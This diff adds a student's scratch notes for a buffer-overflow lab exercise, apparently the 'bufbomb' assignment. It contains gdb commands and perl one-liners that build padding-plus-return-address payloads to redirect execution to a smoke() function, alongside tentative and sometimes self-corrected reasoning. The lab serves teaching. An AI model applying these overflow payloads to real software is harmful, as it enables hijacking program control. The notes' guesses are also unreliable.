@@ -1,0 +1,36 @@
+b *getbuf+34
+r -u haganc3 < t2
+
+
+perl -e 'print "61 "x40, "00 50 55 56"' >t2
+cat t2 | ./hex2raw | ./bufbomb -u haganc3
+
+perl -e 'print "61 "x40, "5d 13 00 00"' >t2
+./hex2raw < t2 > exploit-raw.txt
+gdb bufbomb
+b *getbuf+34
+r -u haganc3 < exploit-raw.txt
+
+p/d ($ebp-$esp) 
++ 31 = 56
++ 34 = 40
++ 39 = 40
+
+Replacing  0x55683e00
+So it is either 40 or 56
+Meaning we need 61 * 36 or 61 * 52 WRONG it is either 61 * 40 or 61 * 56 and it is 61 * 40
+
+Using:
+perl -e 'print "61 "xT, "62 6c 55 56"'
+passes at T = 31 fails at T = 32
+Using:
+perl -e 'print "61 "x40, "5d 63 55 56"' >t2
+cat t2 | ./hex2raw | ./bufbomb -u haganc3
+I got Oops!: You executed an illegal instruction
+Does smoke location need to be diffrent?
+THIS MAKES SENSE!!!!!!!!!!!
+
+With 0000135d = 00 00 13 5d = 5d 13 00 00 NO! -> found smoke in objdump & grep -i "smoke" d.txt
+With 5655635d = 56 55 63 5d = 5d 63 55 56 NO! -> found smoke using disas smoke @ +0 <- Think this is right
+Diffrence of 56555000
+Why are these diffrent????????????
